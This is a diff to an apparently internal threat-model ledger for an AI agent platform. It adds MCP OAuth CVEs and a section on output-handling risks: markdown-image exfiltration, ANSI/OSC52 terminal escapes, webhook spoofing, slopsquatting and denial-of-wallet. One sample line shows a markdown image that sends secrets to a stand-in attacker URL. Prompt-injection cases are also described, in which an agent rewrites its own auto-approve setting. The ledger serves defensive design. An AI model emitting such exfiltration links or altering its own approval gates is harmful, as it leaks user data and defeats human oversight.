@@ -240,7 +240,10 @@ later malicious update to harvest env/API keys. **Tool shadowing / line jumping*
 whose name/description shadows a legitimate one so the router hands it sensitive params. **Confused
 deputy / token passthrough** — an MCP server forwards a client token to a downstream API without
 validating audience. First malicious MCP package observed in the wild Sept 2025; MCP Inspector
-`CVE-2025-49596` (9.4) for the unauth-exec variant.
+`CVE-2025-49596` (9.4) for the unauth-exec variant. The OAuth confused-deputy is now concrete:
+FastMCP `CVE-2026-27124` (missing consent verification in the OAuth-proxy callback) and `mcp-remote`
+`CVE-2025-6514` (command injection via a malicious OAuth server, 437k+ downloads) chain to one-click
+account takeover.
 
 **How our design changes the outcome.**
 - **Trust tiers + signing for skills/MCP.** ADR-083 (skills/MCP trust) and ADR-069/070 (code-registry
@@ -255,8 +258,10 @@ validating audience. First malicious MCP package observed in the wild Sept 2025;
   Medley salvage pipeline (entry 13) are **re-scanned at every use**, not just at install — so a tool
   that is benign when adopted and later mutates its payload is caught at execution time, which is the
   exact window a rug-pull exploits.
-- **No token passthrough.** Authz is scoped per principal (ADR-068); we don't forward caller tokens
-  to downstream APIs as bearer credentials — the confused-deputy primitive is absent by design.
+- **No token passthrough + OAuth consent/audience validation.** Authz is scoped per principal
+  (ADR-068); we don't forward caller tokens to downstream APIs as bearer credentials, and OAuth flows
+  (ADR-059) validate the audience/consent — the confused-deputy primitive is absent by design. This is
+  the exact failure behind the live MCP-OAuth CVEs below.
 - **microVM containment (ADR-093)** bounds what a poisoned/rug-pulled tool can reach once running.
 
 **Upstream up to 9.4 → Maistro residual ~3 (Reduced).** Poisoning and rug-pull become detectable,
@@ -662,6 +667,117 @@ specification is ahead of the wiring, and are the build priorities this ledger e
 
 ---
 
+## UX, rendering & output-handling surface
+
+The classes above are mostly about what an agent *does*; this section is about what reaches the
+**human** — the chat UI, the CLI, webhooks, and how model/tool output is rendered. These surfaces are
+where "the model said something" silently becomes "the browser fetched an attacker URL" or "the
+terminal ran a clipboard hijack." Posture-scored (`Enforced` / `Designed` / `Partial` / **`Gap`**).
+This section deliberately includes findings against *our own* code.
+
+| # | Surface / breach | Real-world reference | Our state | Posture |
+|---|------------------|----------------------|-----------|---------|
+| U1 | Rendering model output as HTML/markdown → zero-click image exfil / XSS | Copilot + Gemini markdown-injection (Checkmarx); EchoLeak image auto-fetch | Chat renders a markdown *subset* to React nodes — no `dangerouslySetInnerHTML`, **no `<img>` auto-fetch** | Enforced (chat); audit elsewhere |
+| U2 | ANSI / OSC52 terminal-escape injection via tool/LLM output in the CLI | CyberArk "Don't Trust This Title"; Mindgard *AnsiEscaped* | `sanitize()` strips zero-width chars but **not** `\x1b`/control escapes | **Gap** |
+| U3 | Prompt-injection rewrites the agent's *own* approval config | Rehberger: Copilot `chat.tools.autoApprove`, ChatGPT allow-list bypass | Policy/approver store is admin-scoped; config changes route through deconfliction | Designed |
+| U4 | Webhook spoofing / unauthenticated triggers | GitHub/CI webhook forgery class | HMAC-SHA256 + constant-time compare; **but verification skipped if secret unset** | Partial |
+| U5 | Insecure output handling — model output trusted as code / hallucinated deps | OWASP LLM02; slopsquatting (205k phantom package names) | Generated code sandboxed + command-allow-listed; no explicit hallucinated-package guard yet | Partial |
+| U6 | Denial-of-wallet — crafted prompt drives unbounded token/cost | LLM cost-exhaustion class | Quota tracker + rate-limit (ADR-085) + budget hard-veto (SPEC-245) | Partial |
+
+### U1 — Rendering model output (markdown image exfil / XSS)
+
+**Why it's a breach.** The dominant *zero-click* exfil channel in production assistants (Copilot,
+Gemini, the EchoLeak chain) is **rendering**: the model emits a markdown image
+`![](https://attacker/x?d=<secrets>)`, the client auto-fetches it, and the secrets leave in the URL —
+no click, no RCE. Any UI that renders model output as HTML, or as markdown that supports images/raw
+HTML, owns this risk.
+
+**Our state.** The hive-conductor chat (`frontend/src/pages/Chat.tsx`) renders a **dependency-free
+markdown subset to React nodes** — bold, inline/fenced code, bullets, rules — with an explicit
+*"no `dangerouslySetInnerHTML` / no XSS surface"* contract, and **it does not render images at all**,
+so there is no auto-fetch sink. The egress allow-list (entry 4) backstops any fetch that a future
+renderer might introduce. **Posture: Enforced for the chat surface.**
+
+**Residual risk / gaps.** Other surfaces render richer content: `DeckBuilder.tsx` uses
+`dangerouslySetInnerHTML`, and the canvas frontend renders generated media. Those are **not** the
+LLM-chat output path, but they must be audited to confirm no untrusted-model/tool string reaches a
+raw-HTML or `<img src>` sink. **Action:** add a lint/CI rule forbidding `dangerouslySetInnerHTML` on
+any model/tool-derived value.
+
+### U2 — ANSI / OSC52 terminal-escape injection (CLI) — **open gap**
+
+**Why it's a breach.** Tool and LLM output printed to a terminal can carry ANSI escape sequences that
+**hide or rewrite displayed text** (so an approval prompt shows something other than what will run),
+and **OSC 52** sequences that **write the user's clipboard** — a model or tool output can stage a
+malicious command into the clipboard for the user to paste. This is the CLI analogue of U1 and
+directly affects the `maistro` CLI.
+
+**Our state — honest finding.** `security/warden/sanitizer.py::sanitize()` strips zero-width
+characters and collapses whitespace, and `external_content` strips invisible chars on *ingress* — but
+**nothing strips C0/C1 control bytes or `\x1b[`/`\x1b]` (OSC) escape sequences from tool/LLM output on
+the way to the CLI.** A skill or MCP tool that returns ANSI/OSC52 in its output is currently rendered
+verbatim. **Posture: Gap.**
+
+**Action (recommended).** Add an output-side `strip_terminal_escapes()` (drop `\x1b`-introduced CSI/OSC
+sequences and C0/C1 controls except `\n`/`\t`) applied to all tool/model output before CLI display, and
+a Warden detector flag for escape sequences in tool output (it is almost never legitimate). Small,
+self-contained, and closes a real hole — a good first follow-up PR off this ledger.
+
+### U3 — Injection rewrites the agent's own approval config
+
+**Why it's a breach.** Rehberger's 2025 work showed the signature 2025 escalation: prompt-inject the
+agent into editing *its own* settings — flip GitHub Copilot's `chat.tools.autoApprove` to `true`, or
+bypass ChatGPT's domain allow-list — so every subsequent dangerous action self-approves. The gate is
+defeated by editing the gate.
+
+**Our state.** The policy/approver store and the decision audit are **admin-scoped** (ADR-068/073): an
+agent principal can neither read the approver matrix nor write it, and any change to the declarative
+policy (thresholds, allow/deny, auto-approve) routes through the **ADR-074 deconfliction / Rehearse
+gate** — a drift toward "auto-approve everything" is exactly the poisoning signal that gets held for
+admin review, not applied. An agent cannot flip its own `autoApprove`. **Posture: Designed** (the
+admin-scoping is the load-bearing part; the deconfliction gate is Specified).
+
+### U4 — Webhook spoofing / unauthenticated triggers
+
+**Why it's a breach.** Agents act on inbound webhooks (task-progress, CI, GitHub, email). A forged or
+replayed webhook can drive the agent to act on attacker-chosen input, or serve as an SSRF/trigger
+pivot.
+
+**Our state.** `maistro-server/api/webhooks.py` verifies **GitHub HMAC-SHA256** signatures with
+`hmac.compare_digest` (constant-time), and the CI webhook uses a constant-time token compare — good.
+**Honest gap:** if `GITHUB_WEBHOOK_SECRET` is unset, the code logs a warning and **skips verification
+(fail-open)**. **Action:** make missing-secret **fail-closed** in any non-dev posture (refuse the
+webhook rather than process it unsigned). **Posture: Partial.**
+
+### U5 — Insecure output handling + slopsquatting
+
+**Why it's a breach.** OWASP LLM02: treating model output as trusted (rendering it, executing it,
+feeding it to `eval`/SQL/shell). **Slopsquatting** is the supply-chain instance — LLMs hallucinate
+plausible-but-nonexistent package names (none of 16 studied models were clean; 205k phantom names),
+attackers register them, and the next agent that "installs the dependency the model suggested" pulls
+malware.
+
+**Our state.** Generated code executes only in the sandbox (ADR-093) under a command-allow-list
+(`trust_boundary.py`), and outbound effects are irreversible-by-default (ADR-050) — so executing
+hallucinated/poisoned code is contained, not host-level. **Gap:** there is **no explicit
+hallucinated-package guard** — the builders/skills install path should verify a suggested package
+exists, is not freshly-registered, and (ideally) is on a pinned/allow-listed set before install, and
+lean on the SCA gates (`pip-audit`/`osv-scanner`/guarddog in the security-scan toolchain).
+**Posture: Partial / Designed.**
+
+### U6 — Denial-of-wallet
+
+**Why it's a breach.** A crafted prompt (or an injection) that induces maximal-length generation, tool
+loops, or fan-out can run up unbounded model spend — a denial-of-*wallet* attack, the economic
+analogue of DoS.
+
+**Our state.** Per-provider, per-cycle **quota tracking** + **rate-limiting** (ADR-085) and the
+**budget hard-veto** in the authorize ladder (SPEC-245 step 3: over-budget forces `authorized=False`
+regardless of tier) cap the blast radius. **Posture: Partial** — the caps exist; per-request output-token
+ceilings and loop/fan-out budgets are the tuning to confirm.
+
+---
+
 ## Cross-cutting: why the *class* mostly doesn't reach us
 
 The recurring root cause across Langflow/Flowise/n8n/MCP-Inspector is a single anti-pattern:
@@ -723,11 +839,24 @@ in those documents. This ledger should be re-scored as that work lands.
   path-traversal `CVE-2026-34070`; Langflow `CVE-2026-33017` (securityonline).
 - Hermes-agent (Nous Research) threat model: Repello AI; Pebblous; NousResearch/hermes-agent
   `SECURITY.md` (analyst commentary; no landed CVE at time of writing).
+- Markdown image / rendering exfil: Checkmarx (Copilot Chat + Gemini markdown injection); Johann
+  Rehberger / Simon Willison (markdown-image exfiltration; `autoApprove` config-rewrite; ChatGPT
+  allow-list bypass); Zenity (0-click TTPs).
+- ANSI / OSC52 terminal-escape injection: CyberArk ("Don't Trust This Title"); Mindgard (*AnsiEscaped*);
+  The Register; Packetlabs.
+- Slopsquatting / package hallucination: Socket; Mend; SecurityWeek; researchsquare review (205k
+  phantom names, 16 models).
+- MCP OAuth confused-deputy: FastMCP `CVE-2026-27124`; `mcp-remote` `CVE-2025-6514`; Obsidian
+  (one-click account takeover); Adversa (MCP Top-25).
 - Internal: ADR-013, ADR-024, ADR-028, ADR-047, ADR-050, ADR-051, ADR-058, ADR-059, ADR-064,
   ADR-068, ADR-069, ADR-070, ADR-072, ADR-073, ADR-074, ADR-077, ADR-083, ADR-093; SPEC-005,
   SPEC-011, SPEC-012, SPEC-183, SPEC-190, SPEC-245, SPEC-251, SPEC-062126-d421; `security/external_content.py`,
   `security/gate.py`, `security/trust_boundary.py`, `security/dangerous_tools.py`,
-  `security/patterns.py`, `security/sentinel/authz_types.py`, `tools/reversibility_registry.py`,
-  `delivery/dispatch.py`, `skills/parser.py` (`security_scan`), `skills/fixer.py` (`fix_content`),
-  `skills/forge.py`, `skills/canary.py`, `skills/marketplace.py`, `vault.py`.
+  `security/patterns.py`, `security/sentinel/authz_types.py`, `security/warden/sanitizer.py`,
+  `security/secret_equal.py`, `tools/reversibility_registry.py`, `delivery/dispatch.py`,
+  `skills/parser.py` (`security_scan`), `skills/fixer.py` (`fix_content`), `skills/forge.py`,
+  `skills/canary.py`, `skills/marketplace.py`,
+  `maistro-server/api/webhooks.py` (HMAC verify),
+  `hive-conductor/frontend/src/pages/Chat.tsx` (no-`dangerouslySetInnerHTML` markdown subset),
+  `vault.py`.
 ```
